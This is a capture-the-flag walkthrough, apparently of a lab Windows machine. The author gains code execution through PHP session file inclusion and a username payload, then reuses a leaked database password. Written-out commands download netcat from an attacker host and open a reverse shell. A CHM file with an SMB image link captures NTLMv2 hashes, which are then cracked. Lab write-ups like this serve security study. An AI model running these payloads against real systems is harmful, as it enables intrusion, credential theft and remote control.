# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 

# Findings

## External
### Enumeration
![](https://i.imgur.com/KhuCssH.png)
![](https://i.imgur.com/mdPbUWv.png)
![](https://i.imgur.com/4yzX0OJ.png)
![](https://i.imgur.com/pDfGUNz.png)
`\inetpub/wwwroot/user/db.php`
![](https://i.imgur.com/TB9AnJ8.png)
- Using the PHP session u can refer on [[918. 📨File Inclusion]]
	- So To do this Attack, as you see the username of my account is displaying there for i created a new user with a payload as username `<?php system("whoami") ?>`
	![](https://i.imgur.com/wOZwXvh.png)
- Then Boom i got RCE. Now lets make it shell.
```shell
echo 'cmd /c "\\10.10.14.27\share\rex.php"' | iconv -f ascii -t utf-16le | base64 -w0

<?php echo `powershell /enc YwBtAGQAIAAvAGMAIAAiAFwAMQAwAC4AMQAwAC4AMQA0AC4AMgA3AFwAcwBoAGEAcgBlAFwAbgBjADYANAAuAGUAeABlACAALQBlACAAYwBtAGQAIAAxADAALgAxADAALgAxADQALgAyADcAIAA0ADQAMwAiAAoA` ?>

```
- Unfortunatly this doesnt work, so i went back to the 1st place and i just did impacket smb normal powershell
![](https://i.imgur.com/G1JjxPo.png)

![](https://i.imgur.com/rD1UB8t.png)
### Gaining Access
![](https://i.imgur.com/pjiKJcd.png)
## Internal
### Enumeration
- Tried to Run the SQL but it was not working, so i tried password re use and it workeed.
```shell
PS C:\inetpub\wwwroot> cat user/db.php
<?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?>

```
![](https://i.imgur.com/UIIQmGt.png)
### Gaining Access
```shell
$password = convertto-securestring -AsPlainText -Force -String "36mEAhz/B8xQ~2VM"; $credential = new-object -typename System.Management.Automation.PSCredential -argumentlist "SNIPER\chris",$password;Invoke-Command -ComputerName LOCALHOST -ScriptBlock { wget http://10.10.14.27/nc.exe -o C:\Users\chris\nc.exe } -credential $credential;Invoke-Command -ComputerName LOCALHOST -ScriptBlock { C:\Users\chris\nc.exe -e cmd.exe 10.10.14.27 4344} -credential $credential;
```
![](https://i.imgur.com/b5t5u08.png)
### Maintaining Access
```text
PS C:\Docs> cat note.txt
cat note.txt
Hi Chris,
	Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO
```
![](https://i.imgur.com/quzsJOt.png)
![](https://i.imgur.com/rZ8gT96.png)
- This Means, The Admin want to see the documentation and The instrustion tells Us that the format have to be CHM it is compiled HTML.
- For that i can Create A chm on my windows i can do simple smb request and crack the hash to get the password of the admin because th admin will be there to get the documentation of the project.
- I used this for the CHM then COnverted it to chm.
```html
<html>
<body>
<img src=\\10.10.14.27\share\rex.png />
</body>
</html>
```
![](https://i.imgur.com/0MFw4Bl.png)
![](https://i.imgur.com/95D0WvT.png)
```shell
hashcat for ntlmv2
rexder@station ~> hashcat -m 5600 --force ntlm.hash /opt/rockyou.txt
```
![](https://i.imgur.com/wWej3tR.png)


# Random Notes